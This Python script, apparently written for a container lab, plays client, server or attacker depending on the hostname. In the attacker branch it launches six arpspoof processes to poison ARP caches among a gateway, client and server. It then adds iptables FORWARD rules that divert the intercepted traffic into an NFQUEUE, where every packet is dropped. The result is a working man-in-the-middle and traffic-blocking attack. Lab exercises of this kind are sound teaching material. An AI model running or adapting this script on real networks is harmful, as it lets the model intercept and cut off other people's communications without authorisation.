# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import socket
import re as r
import subprocess
import urllib.request
import http.client
from asyncio.subprocess import STDOUT
from time import sleep

import netfilterqueue
from netfilterqueue import NetfilterQueue


def handler_queue_1(pkt: netfilterqueue.Packet):
    print(pkt)

    # as a test, drop each packet after printing it!
    pkt.drop()

def get_ip():
    conn = http.client.HTTPSConnection("8.8.8.8", timeout=5)
    try:
        conn.request("HEAD", "/")
        return "Connected to Internet!"
    except Exception:
        return "no connection!"
    finally:
        conn.close()

def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f"Hi, {name}, i'm {socket.gethostname()} and you can find me at {socket.gethostbyname(socket.gethostname())}")  # Press Ctrl+F8 to toggle the breakpoint.
    print("Public ip address: ", get_ip())

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi('PyCharm')

    if socket.gethostname() == "client":
        # try to connect via tls to server after 10s...
        print("client connected...")
        p = subprocess.Popen(["ping", "172.18.0.3"])
        sleep(60)
        p.kill()
    elif socket.gethostname() == "server":
        # listen to a socket...
        print("server connected...")
        sleep(60)

    else:

        print("attacker online...")
        with open("/dev/null", "wb") as fnull:
            # attacker
            # run arpspoof ASAP
            # p = subprocess.Popen(["ifconfig", "-a"], stdout=1, stderr=1) # use this line or open a terminal to check the interface name, should be eth0
            p = list()
            print("starting arpspoofing...")
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.2"])) # tell the gateway i'm the client
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.1"])) # tell the client i'm the gateway
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.3"])) # tell the gateway i'm the server
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.1"])) # tell the server i'm the gateway
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.2"])) # tell the server i'm the client
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.3"])) # tell the client i'm the server
            # subprocess.Popen(["sysctl", "-w" ,"net.ipv4.ip_forward=1"]) # enable port forwarding for intercepted packets... already active and can't modify it since file system is read only.
            print("arpspoofing started.")
            #The iptables chain of interest is FORWARD, since those packets are not destined to us (172.18.0.4), but to OTHER IPs!!!
            #In fact, iptables works at the TCP/IP level (layer 3 and 4), so even if frames (layer 2, ethernet) are directed to us
            # (and according to intuitition our chain of interest would be INPUT), they are still at layer 2!!!!!!
            # And so, IPTABLES, which starts to look into network packets ONLY at layer 3 (IP), THOSE PACKETS ARE NOT DIRECTED TO US AND SO DO NOT PERTAIN TO THE INPUT CHAIN.
            # why this comment? Well, to spare you some time debugging this code!

            # must capture every packet destined to the server coming from the client, ...
            p.append(subprocess.Popen(
                ["iptables", "-I", "FORWARD", "-s", "172.18.0.2", "-d", "172.18.0.3", "-j", "NFQUEUE", "--queue-num", "1"]))
            #and every packet destined to the client coming from the server...
            p.append(subprocess.Popen(
                ["iptables", "-I", "FORWARD", "-s", "172.18.0.3", "-d", "172.18.0.2",  "-j", "NFQUEUE", "--queue-num","1"]))
            # as they come, they will be ordered in the queue (remember, queues are FIFOs!)

            nfqueue = NetfilterQueue()
            nfqueue.bind(1, handler_queue_1)

            s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)

            print("Waiting for packets...")
            try:
                nfqueue.run_socket(s)
            except KeyboardInterrupt:
                print('')
            finally:
                s.close()
                nfqueue.unbind()

            for proc in p:
                proc.kill()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
